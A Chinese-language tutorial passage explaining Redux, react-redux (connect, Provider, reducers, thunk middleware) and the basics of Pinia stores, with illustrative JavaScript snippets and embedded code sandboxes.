<p><code>store.getState()</code> &#x5BF9; Store &#x751F;&#x6210;&#x5FEB;&#x7167;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x96C6;&#x5408; State&#x3002;</p>
<p>&#x72B6;&#x6001;&#x53D8;&#x5316;&#x65F6;&#xFF0C;&#x5E94;&#x5728;&#x7EC4;&#x4EF6;&#x4E2D;&#x53D1;&#x51FA;&#x901A;&#x77E5;&#x3002;&#x63A5;&#x53D7; action &#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x7684; <code>store.dispatch()</code> &#x662F; View &#x53D1;&#x51FA; action &#x7684;&#x552F;&#x4E00;&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-javascript">// Xx&#x7EC4;&#x4EF6;.js
store.dispatch(xxxAction(value))
</code></pre>
<pre><code class="language-javascript">// Xx&#x7EC4;&#x4EF6;_action.js
export const xxxOperateAction = (data) =&gt; ({ type: xxxOperate, data });
</code></pre>
<p>Store &#x63A5;&#x53D7; Action &#x540E;&#x751F;&#x6210;&#x65B0; State &#x7684;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x53EB;&#x505A; Reducer&#x3002;</p>
<pre><code class="language-javascript">// Xx&#x7EC4;&#x4EF6;_reducer.js
const initState = 0; // &#x521D;&#x59CB;&#x5316;&#x72B6;&#x6001;
export default function xxReducer(preState = initState, action) {
  // redux&#x4F1A;&#x5728;&#x5F00;&#x59CB;&#x65F6;&#x8C03;&#x7528;
  // &#x6CA1;&#x6709;&#x4F20;&#x9012;preState&#x6216;&#x8005;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;undefined&#x5219;&#x4FEE;&#x6539;&#x4E3A;0
  // console.log(preState, action); // {type: &apos;@@redux/INIT1.6.3.4.l.f&apos;}
  if (preState === undefined) preState = 0;
  const { type, data } = action;
  switch (type) {
    case &quot;operate1&quot;:
      return preState ??? data;
    case &quot;operate2&quot;:
      return preState ??? data;
    default:
      // &#x521D;&#x59CB;&#x5316; Store -&gt; reducer &#x5524;&#x9192;&#x521D;&#x59CB;&#x5316;
      return preState;
  }
}
</code></pre>
<ul>
<li>reducer &#x7EAF;&#x51FD;&#x6570;&#x65E0;&#x9700;&#x624B;&#x52A8;&#x8C03;&#x7528;&#xFF0C;&#x4F1A;&#x88AB; <code>store.dispatch()</code> &#x81EA;&#x52A8;&#x89E6;&#x53D1;&#x6267;&#x884C;</li>
</ul>
<p>&#x751F;&#x6210; store &#x65F6;&#x5C06; reducer &#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x5165; <code>createStore(xxxReducer)</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x7EAF;&#x51FD;&#x6570; reducer &#x5728;&#x76F8;&#x540C;&#x8F93;&#x5165;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5FC5;&#x5B9A;&#x5F97;&#x5230;&#x540C;&#x6837;&#x7684;&#x8F93;&#x51FA;&#x3002;&#x6B64;&#x51FD;&#x6570;&#x4E2D;&#x4E0D;&#x80FD;&#x8C03;&#x7528;&#x7CFB;&#x7EDF; IO &#x548C; <code>Date.now()</code>&#x3001;<code>Math.random()</code> &#x7B49;&#x65B9;&#x6CD5;&#x3002;</p>
<iframe src="https://codesandbox.io/embed/redux-2dl66?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="redux" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<p>&#x5927;&#x578B;&#x5E94;&#x7528;&#x7684; state &#x548C; reducer &#x4F53;&#x91CF;&#x5E9E;&#x5927;&#xFF0C;Redux &#x63D0;&#x4F9B; combineReducers &#x65B9;&#x6CD5;&#xFF0C;&#x7528;&#x4E8E;&#x5C06; reducer &#x62C6;&#x5206;&#x3002;&#x5B9A;&#x4E49;&#x7684;&#x5404;&#x4E2A;&#x5B50; reducer &#x53EF;&#x4EE5;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x5408;&#x6210;&#x4E3A;&#x603B; reducer &#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-javascript">import { combineReducers } from &apos;redux&apos;;
...
const reducer = combineReducers({
  a: doSomethingWithA,
  b: processB,
  c: c
})

// &#x7B49;&#x540C;&#x4E8E;
function reducer(state = {}, action) {
  return {
    a: doSomethingWithA(state.a, action),
    b: processB(state.b, action),
    c: c(state.c, action)
  }
}
</code></pre>
<ul>
<li>&#x5F02;&#x6B65; action =&gt; &#x9664;&#x5F00;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#xFF0C;action &#x7684;&#x503C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x51FD;&#x6570;</li>
</ul>
<p>&#x5F02;&#x6B65;&#x64CD;&#x4F5C;&#x4E0D;&#x5728;&#x7EC4;&#x4EF6;&#x4E2D;&#x6307;&#x660E;&#xFF0C;&#x800C;&#x662F;&#x5728; Action Creators&#x3002;&#x5F02;&#x6B65; action &#x4E2D;&#x4E00;&#x822C;&#x4F1A;&#x8C03;&#x7528;&#x540C;&#x6B65; action&#xFF0C;&#x524D;&#x8005;&#x76F4;&#x63A5;&#x88AB; Store &#x6267;&#x884C;&#xFF0C;&#x540E;&#x8005;&#x4F20;&#x9012;&#x7ED9; Reducers &#x6267;&#x884C;&#x3002;</p>
<pre><code class="language-jsx">// &#x7EC4;&#x4EF6;
handleAsync = () =&gt; {
  const {value} = this.handleNumber;
  store.dispatch(createHandleAsyncAction(value*1, 500))
}
// xxx_action.js
export const createHandleAsyncAction = (data, time) =&gt; {
  return (dispatch) =&gt; { // &#x5F02;&#x6B65; action &#x5373;&#x8FD4;&#x56DE;&#x7684;&#x4E0D;&#x518D;&#x662F;&#x5BF9;&#x8C61;&#x800C;&#x662F;&#x51FD;&#x6570;
    setTimeout(()=&gt;{
      dispatch(createHandleSyncAction(data))
    }, time)
  }
}
</code></pre>
<p>&quot;Error: Actions must be plain objects.Use custom middleware for async actions.&quot;</p>
<p>&#x9ED8;&#x8BA4;&#x4F20;&#x9012;&#x7ED9; Store &#x7684; action &#x5E94;&#x8BE5;&#x662F;&#x4E00;&#x4E2A;&#x4E00;&#x822C;&#x5BF9;&#x8C61;&#xFF0C;&#x5426;&#x5219;&#x8BC6;&#x522B;&#x4E0D;&#x4E86;&#x3002;</p>
<p>&#x6B64;&#x65F6;&#x9700;&#x5F15;&#x5165; redux-thunk &#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x4EE5;&#x8BA9; Store &#x6267;&#x884C;&#x51FD;&#x6570;&#xFF0C;&#x4E0D;&#x518D;&#x4EA4;&#x7ED9; Reducers&#x3002;</p>
<blockquote>
<p>&#x591A;&#x4E2A; middleware &#x53EF;&#x4EE5;&#x88AB;&#x7EC4;&#x5408;&#x5230;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x5F62;&#x6210; middleware &#x94FE;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E2A; middleware &#x90FD;&#x4E0D;&#x9700;&#x8981;&#x5173;&#x5FC3;&#x94FE;&#x4E2D;&#x5B83;&#x524D;&#x540E;&#x7684; middleware &#x7684;&#x4EFB;&#x4F55;&#x4FE1;&#x606F;&#x3002;</p>
</blockquote>
<pre><code class="language-jsx">import {createStore, applyMiddleware} from &apos;redux&apos;
</code></pre>
<h3 id="react-redux">react-redux</h3>
<p>&#x4F7F;&#x7528; facebook &#x5B98;&#x65B9;&#x7684;&#x63D2;&#x4EF6; react-redux &#x53EF;&#x4EE5;&#x5728; React &#x4E2D;&#x66F4;&#x52A0;&#x65B9;&#x4FBF;&#x7684;&#x4F7F;&#x7528; redux&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/react-redux---.png" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;" loading="lazy"></p>
<ul>
<li>&#x8FDE;&#x63A5;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x548C; UI &#x7EC4;&#x4EF6; =&gt; react-redux &#x4E2D;&#x7684; <a href="https://react-redux.js.org/api/connect">connect</a> &#x51FD;&#x6570;</li>
</ul>
<p>UI &#x7EC4;&#x4EF6;&#x8D1F;&#x8D23;&#x9875;&#x9762;&#x7684;&#x5448;&#x73B0;&#x548C;&#x4E8B;&#x4EF6;&#x7684;&#x7ED1;&#x5B9A;&#xFF0C;&#x901A;&#x5E38;&#x5B58;&#x653E;&#x4E8E; components &#x76EE;&#x5F55;&#x3002;</p>
<p>&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x8D1F;&#x8D23;&#x4F20;&#x9012;&#x72B6;&#x6001;&#x4EE5;&#x53CA;&#x72B6;&#x6001;&#x64CD;&#x4F5C;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x901A;&#x5E38;&#x5B58;&#x653E;&#x4E8E; containers &#x76EE;&#x5F55;&#x3002;</p>
<p>&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x5E76;&#x975E;&#x76F4;&#x63A5;&#x5199;&#x6210;&#x4E00;&#x822C;&#x7EC4;&#x4EF6;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x800C;&#x662F;&#x9700;&#x8981;&#x501F;&#x52A9; connect &#x51FD;&#x6570;&#x4EA7;&#x751F;&#x3002;</p>
<pre><code class="language-jsx">/* containers/Xxx */
// &#x5F15;&#x5165; UI &#x7EC4;&#x4EF6;
import XxxUI from &quot;../../component/Xxx&quot;
// &#x5F15;&#x5165; connect &#x8FDE;&#x63A5; UI &#x7EC4;&#x4EF6;&#x548C; redux
import {connect} from &quot;react-redux&quot;
// &#x4F7F;&#x7528; connect &#x521B;&#x5EFA;&#x5E76;&#x66B4;&#x9732;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;
export default connect([mapStateToProps], [mapDispatchToProps], [mergeProps], [options])(XxxUI)
</code></pre>
<p>&#x8FDE;&#x63A5;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x4E2D;&#x4F20;&#x5165;&#x9700;&#x8981;&#x5305;&#x88F9;&#x7684;&#x7EC4;&#x4EF6;&#x6267;&#x884C;&#x65F6;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x5728;&#x5F15;&#x5165;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#x7ED9;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x6807;&#x7B7E;&#x4F20;&#x5165; store&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x73B0; &quot;Error: Could not find &apos;store&apos; in the context of &apos;Connect(Xxx)&apos;&quot; &#x7684;&#x62A5;&#x9519;&#x3002;</p>
<pre><code class="language-jsx">ReactDOM.render(
  &lt;ContainerComponent store={store}&gt;
    &lt;App /&gt;
  &lt;/ContainerComponent&gt;,
  document.getElementById(&quot;root&quot;)
);
</code></pre>
<ul>
<li>react-redux &#x4E2D;&#x7684; connect &#x4F5C;&#x4E3A;&#x9AD8;&#x9636;&#x7EC4;&#x4EF6;&#x53EF;&#x4EE5;&#x4F20;&#x5165;&#x56DB;&#x4E2A;&#x53C2;&#x6570;</li>
</ul>
<pre><code class="language-jsx">function connect(mapStateToProps?, mapDispatchToProps?, mergeProps?, options?)
</code></pre>
<p>&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x4E0E; UI &#x7EC4;&#x4EF6;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x901A;&#x8FC7; props &#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7684;&#x6CE8;&#x5165;&#xFF08;&#x975E;&#x6807;&#x7B7E;&#x5D4C;&#x5957;&#xFF09;&#x3002;</p>
<p>mapStateToProps =&gt; Function &#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x672C;&#x8D28;&#x662F;&#x5C06;&#x72B6;&#x6001;&#x5E26;&#x5165;&#x89C6;&#x56FE;&#x7EC4;&#x4EF6;&#x3002;&#x8BE5;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x5C06;&#x5206;&#x522B;&#x4F5C;&#x4E3A;&#x4F20;&#x9012;&#x7ED9; UI &#x7EC4;&#x4EF6; props &#x7684; key &#x4E0E; value&#x3002;</p>
<pre><code class="language-jsx">mapStateToProps?: (state, ownProps?) =&gt; Object
</code></pre>
<p>mapDispatchToProps =&gt; Object &#x6216; Function &#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x672C;&#x8D28;&#x662F;&#x5C06;&#x64CD;&#x4F5C;&#x72B6;&#x6001;&#x7684;&#x65B9;&#x6CD5;&#x5E26;&#x5165; UI &#x7EC4;&#x4EF6;&#x3002;&#x8BE5;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x4F5C;&#x7528;&#x540C;&#x4E0A;&#x3002;</p>
<pre><code class="language-jsx">mapDispatchToProps?: Object | (dispatch, ownProps?) =&gt; Object
</code></pre>
<p>mapDispatchToProps &#x6307;&#x5B9A;&#x4E3A;&#x5BF9;&#x8C61;&#x65F6;&#xFF0C;&#x5176;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x90FD;&#x662F;&#x4E00;&#x4E2A; Action Creators&#x3002;</p>
<blockquote>
<p>React-Redux binds the dispatch of your store to each of the action creators using bindActionCreators. The result will be regarded as dispatchProps, which will be either directly merged to connected components, or supplied to mergeProps as the second argument. <a href="https://react-redux.js.org/api/connect#object-shorthand-form">here</a>.</p>
</blockquote>
<pre><code class="language-jsx">bindActionCreators(mapDispatchToProps, dispatch)
</code></pre>
<blockquote>
<p>mapStateToProps &#x548C; mapDispatchToProps &#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5728;&#x5185;&#x90E8;&#x5206;&#x522B;&#x79F0;&#x4E3A; stateProps &#x548C; dispatchProps&#x3002;</p>
</blockquote>
<p>mergeProps =&gt; Function &#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5C06;&#x5B9A;&#x4E49;&#x7684; stateProps&#x3001;dispatchProps &#x548C;&#x7EC4;&#x4EF6;&#x81EA;&#x8EAB;&#x7684; props &#x4F20;&#x5165;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x5BF9;&#x8C61;&#x5C06;&#x4F5C;&#x4E3A; props &#x4F20;&#x9012;&#x5230;&#x88AB;&#x5305;&#x88C5;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
<p>&#x8BE5;&#x5C5E;&#x6027;&#x7528;&#x4E8E;&#x6839;&#x636E;&#x7EC4;&#x4EF6;&#x7684; props &#x5BF9; state &#x8FDB;&#x884C;&#x7B5B;&#x9009;&#xFF0C;&#x6216;&#x5C06; props &#x4E2D;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x4E0E; Action Creator &#x6346;&#x7ED1;&#x3002;</p>
<p>&#x7701;&#x7565;&#x8BE5;&#x5C5E;&#x6027;&#x65F6;&#xFF0C;connect &#x9ED8;&#x8BA4;&#x8FD4;&#x56DE; Object.assign({}, stateProps, dispatchProps)&#x3002;</p>
<pre><code class="language-jsx">mergeProps?: (stateProps, dispatchProps, ownProps) =&gt; Object
</code></pre>
<p>React Redux &#x76F8;&#x8F83;&#x4E8E; Redux&#xFF0C;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x9ED8;&#x8BA4;&#x62E5;&#x6709;&#x76D1;&#x6D4B; redux &#x72B6;&#x6001;&#x6539;&#x53D8;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x65E0;&#x9700;&#x5728; index &#x4E2D;&#x4F7F;&#x7528; store.subscribe&#x3002;</p>
<p>Provider &#x4F1A;&#x81EA;&#x52A8;&#x5C06; store &#x6CE8;&#x5165;&#x5E94;&#x7528;&#x4E2D;&#x7684;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;</p>
<p>store &#x4EE5;&#x6807;&#x7B7E;&#x5C5E;&#x6027;&#x7684;&#x65B9;&#x5F0F;&#x6DFB;&#x52A0;&#x5230;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#xFF0C;&#x4F1A;&#x5B58;&#x5728;&#x4EE3;&#x7801;&#x5197;&#x4F59;&#x7684;&#x95EE;&#x9898; =&gt; &#x53EF;&#x901A;&#x8FC7; react-redux &#x63D0;&#x4F9B;&#x7684; &lt;Provider /&gt; &#x7EC4;&#x4EF6;&#x8FDB;&#x884C;&#x6279;&#x91CF;&#x6CE8;&#x5165;&#x3002;</p>
<pre><code class="language-javascript">// &#x4F18;&#x5316;&#x524D;
// App.jsx
import React, { Component } from &quot;react&quot;;
import {store} from &quot;./redux/store&quot;
import Xxx from &quot;./containers/Xxx/index.jsx&quot;;

export default class App extends Component {
  render() {
    return (
      &lt;div&gt;
        &lt;Xxx state={state}/&gt;
        ...
      &lt;/div&gt;
    );
  }
}
</code></pre>
<pre><code class="language-javascript">// &#x4F18;&#x5316;&#x540E;
// index.js
import React from &quot;react&quot;;
import ReactDOM from &quot;react-dom&quot;;
import App from &quot;./App&quot;;
import store from &quot;./redux/store&quot;;
import { Provider } from &quot;react-redux&quot;;

ReactDOM.render(
  &lt;Provider store={store}&gt;
    &lt;App /&gt;
  &lt;/Provider&gt;,
  document.getElementById(&quot;root&quot;)
);
</code></pre>
<p>&#x6574;&#x5408; UI &#x7EC4;&#x4EF6;&#x4E0E;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6; =&gt; &#x653E;&#x5165;&#x4E00;&#x4E2A; jsx</p>
<p>combineReducers &#x4F20;&#x5165;&#x7684;&#x5BF9;&#x8C61;&#x5C31;&#x662F; Redux &#x4FDD;&#x5B58;&#x7684;&#x603B;&#x72B6;&#x6001;&#x5BF9;&#x8C61;&#x3002;</p>
<p>reducer &#x4E2D;&#x7684; preState &#x4F1A;&#x8FDB;&#x884C;&#x6D45;&#x6BD4;&#x8F83;&#xFF0C;&#x6240;&#x4EE5;&#x7528; push &#x4E4B;&#x6D41;&#x65B9;&#x5F0F;&#x4E0D;&#x53EF;&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#x9875;&#x9762;&#x3002;&#x6B64;&#x5916;&#x5BF9;&#x6570;&#x7EC4;&#x7684;&#x6539;&#x53D8;&#x4F7F;&#x7528; [newData, ...oldData] &#x4E0D;&#x4F1A;&#x7834;&#x574F; reducer &#x7EAF;&#x51FD;&#x6570;&#x7684;&#x539F;&#x5219;&#x3002;</p>
<p>&#x7EAF;&#x51FD;&#x6570;&#xFF1A;&#x76F8;&#x540C;&#x8F93;&#x5165;&#x5FC5;&#x5B9A;&#x5F97;&#x5230;&#x76F8;&#x540C;&#x7684;&#x8F93;&#x51FA;&#x3002;&#x5FC5;&#x987B;&#x9075;&#x5B88;&#x4EE5;&#x4E0B;&#x7EA6;&#x675F;&#xFF1A;&#x4E0D;&#x7684;&#x6539;&#x5199;&#x53C2;&#x6570;&#x6570;&#x636E;&#xFF1B;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x526F;&#x4F5C;&#x7528;&#xFF1B;&#x4E0D;&#x53EF;&#x8C03;&#x7528; random now &#x4E4B;&#x6D41;&#x7684;&#x4E0D;&#x7EAF;&#x65B9;&#x6CD5;&#x3002;</p>
<p>redux devtools &#x9700;&#x914D;&#x5408;&#x9879;&#x76EE;&#x5B89;&#x88C5; redux-devtools-extension &#x5E93;&#x4F7F;&#x7528;</p>
<p>@redux-devtools/extension</p>
<pre><code class="language-jsx">import {composeWithDevTools} from &apos;redux-devtools-extension&apos;
export default createStore(rootReducer, composeWithDevTools(applyMiddleWare(thunk)))
</code></pre>
<iframe src="https://codesandbox.io/embed/react-redux-e4y0v?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="react-redux" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe><!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="pinia">Pinia</h2>
<p>Vuex &#x5F00;&#x53D1;&#x56E2;&#x961F;&#x7684;&#x65B0;&#x4F5C;&#x54C1; <a href="https://pinia.vuejs.org/">Pinia</a>&#xFF0C;&#x5BF9; Vue2|3 &#x90FD;&#x6709;&#x5F88;&#x597D;&#x7684;&#x652F;&#x6301;&#xFF0C;&#x4E5F;&#x662F;&#x5F3A;&#x63A8;&#x7684;&#x72B6;&#x6001;&#x7BA1;&#x7406;&#x5E93;&#x3002;&#x6CE8;&#x610F; Pinia &#x4E5F;&#x652F;&#x6301;&#x5728; Vue-devtools &#x4E2D;&#x8FDB;&#x884C;&#x8C03;&#x8BD5;&#xFF0C;&#x4F46;&#x9700; Vue Devtools v6 &#x7248;&#x672C;&#x3002;</p>
<blockquote>
<p>Pinia v2 no longer hijacks Vue Devtools v5, it requires Vue Devtools v6. Find the download link on the Vue Devtools documentation for the beta channel of the extension.</p>
</blockquote>
<h3 id="%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B">&#x5FEB;&#x901F;&#x5F00;&#x59CB;</h3>
<ul>
<li>Advantages</li>
</ul>
<p>&#x8F83; Vuex &#x76F8;&#x6BD4;&#xFF0C;Pinia &#x629B;&#x5F03;&#x4E86; Mutations &#x64CD;&#x4F5C;&#xFF0C;&#x4FDD;&#x7559; State&#x3001;Getters &#x548C; Actions&#xFF1B;&#x4E0D;&#x9700;&#x8981;&#x5D4C;&#x5957;&#x6A21;&#x5757;&#xFF0C;&#x7B26;&#x5408; Composition API &#x548C;&#x4EE3;&#x7801;&#x6241;&#x5E73;&#x5316;&#xFF1B;&#x5B8C;&#x6574;&#x652F;&#x6301; Typescript&#xFF1B;&#x53EF;&#x5B9E;&#x73B0;&#x4EE3;&#x7801;&#x81EA;&#x52A8;&#x5206;&#x5272;&#x3002;</p>
<ul>
<li>Vite &amp; Pinia &amp; TS</li>
</ul>
<pre><code class="language-shell"># &#x642D;&#x5EFA;&#x9879;&#x76EE;
npm create vite@latest # vue + ts
# &#x5B89;&#x88C5; pinia
npm install pinia
</code></pre>
<pre><code class="language-javascript">import { createPinia } from &apos;pinia&apos;
...
app.use(createPinia())
</code></pre>
<ul>
<li>API Documentation / pinia / _StoreWithState =&gt; <a href="https://pinia.vuejs.org/api/interfaces/pinia._StoreWithState.html#dispose">Methods</a></li>
</ul>
<h3 id="store-%E4%BB%93%E5%BA%93">Store &#x4ED3;&#x5E93;</h3>
<p>&#x786E;&#x4FDD;&#x5728;&#x9879;&#x76EE; /src/main.ts &#x91CC;&#x5F15;&#x5165; pinia &#x540E;&#xFF0C;&#x76F4;&#x63A5;&#x5728; /src &#x76EE;&#x5F55;&#x4E0B;&#x65B0;&#x5EFA; store &#x76EE;&#x5F55;&#x4F5C;&#x4E3A;&#x72B6;&#x6001;&#x7BA1;&#x7406;&#x5E93;&#x3002;</p>
<p>Store &#x662F;&#x4F7F;&#x7528; defineStore() &#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x540D;&#x79F0;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F20;&#x9012;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x5305;&#x542B; state&#x3001;getters &#x548C; actions &#x7684;&#x5BF9;&#x8C61;&#x3002;</p>
<pre><code class="language-javascript">// ?.ts
import { defineStore } from &apos;pinia&apos;
// useStore =&gt; useUser&#x3001;useCart
export const useStore = defineStore(&apos;main&apos;,{ // &#x5BB9;&#x5668;&#x8D77;&#x540D; =&gt; main
  state:()=&gt;{ return {} }, // SPA &#x7684;&#x5168;&#x5C40;&#x72B6;&#x6001;
  getters:{}, // &#x76D1;&#x89C6;&#x6216;&#x8BA1;&#x7B97;&#x72B6;&#x6001;&#x7684;&#x53D8;&#x5316; =&gt; &#x6709;&#x7F13;&#x5B58;&#x7684;&#x529F;&#x80FD;
  actions:{} // &#x64CD;&#x4F5C; state &#x91CC;&#x6570;&#x636E;&#x7684;&#x4E1A;&#x52A1;&#x903B;&#x8F91;
})
</code></pre>
<p>store &#x662F;&#x5728;&#x7EC4;&#x4EF6;&#x7684; <code>setup()</code> &#x4E2D;&#x901A;&#x8FC7;&#x8C03;&#x7528; <code>xxStore()</code> &#x8FDB;&#x884C;&#x7684;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE; state&#x3001;getters &#x548C; actions &#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x4EFB;&#x4F55;&#x5C5E;&#x6027;&#x4E0E;&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-javascript">// ?.vue
import { useStore } from &apos;@/stores/counter&apos; // &#x63A5;&#x6536;&#x66B4;&#x9732;&#x7684; xxxStore
export default {
  setup() {
    const store = useStore()
    ...
    return {
      store, // &#x53EF;&#x8FD4;&#x56DE;&#x6574;&#x4E2A; store &#x5B9E;&#x4F8B;&#x4EE5;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x4F7F;&#x7528;
    }
  },
}
</code></pre>
<p>store &#x662F;&#x7528; reactive &#x5305;&#x88F9;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x6545;&#x4E0D;&#x9700;&#x8981;&#x5728; getter &#x4E4B;&#x540E;&#x5199; .value&#xFF1B;&#x5176;&#x6B21;&#x662F;&#x548C; setup &#x4E2D;&#x7684; props &#x4E00;&#x6837;&#xFF0C;&#x76F4;&#x63A5;&#x89E3;&#x6784;&#x5931;&#x53BB;&#x54CD;&#x5E94;&#x5F0F;&#x3002;</p>
<p>&#x82E5;&#x9700;&#x5728;&#x63D0;&#x53D6;&#x5C5E;&#x6027;&#x7684;&#x540C;&#x65F6;&#x4FDD;&#x6301;&#x54CD;&#x5E94;&#x5F0F; =&gt; &#x901A;&#x8FC7; <code>storeToRefs()</code> &#x4F20;&#x5165; store &#x5BF9;&#x8C61;&#x518D;&#x8FDB;&#x884C;&#x89E3;&#x6784;&#x3002;</p>
<pre><code class="language-javascript">const store = useStore();
// const {helloPinia,count} = store; // &#x89E3;&#x6784;&#x4F7F;&#x7528;&#x5931;&#x53BB;&#x54CD;&#x5E94;&#x5F0F; -&gt; &#x653E;&#x5165; reactive({}) &#x4E5F;&#x4E0D;&#x884C;
const {[state01],[state02],[getters01]} = storeToRefs(store);
</code></pre>
<h3 id="state-%E7%8A%B6%E6%80%81">State &#x72B6;&#x6001;</h3>
<p>state &#x88AB;&#x5B9A;&#x4E49;&#x4E3A;&#x8FD4;&#x56DE;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x901A;&#x8FC7; store &#x5B9E;&#x4F8B;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x548C;&#x5199;&#x5165;&#x72B6;&#x6001;&#xFF0C;&#x4E5F;&#x53EF;&#x8C03;&#x7528; store &#x4E0A;&#x7684; $reset() &#x65B9;&#x6CD5;&#x5C06;&#x72B6;&#x6001;&#x91CD;&#x7F6E;&#x5230;&#x5176;&#x521D;&#x59CB;&#x503C;&#x3002;</p>
<pre><code class="language-javascript">import { defineStore } from &apos;pinia&apos;
const xxxStore = defineStore(&apos;storeId&apos;, {
  state: () =&gt; { // &#x63A8;&#x8350;&#x4F7F;&#x7528;&#x5B8C;&#x6574;&#x7C7B;&#x578B;&#x63A8;&#x65AD;&#x7684;&#x7BAD;&#x5934;&#x51FD;&#x6570;
    return { // &#x6240;&#x6709;&#x8FD9;&#x4E9B;&#x5C5E;&#x6027;&#x90FD;&#x5C06;&#x81EA;&#x52A8;&#x63A8;&#x65AD;&#x5176;&#x7C7B;&#x578B;
      [attribute01]: 0, [attribute02]: &apos;zs&apos;, [attribute03]: true,
    }
  },
})
</code></pre>
<pre><code class="language-javascript">const store = xxxStore()
store.[attribute01]++
store.$reset()
</code></pre>
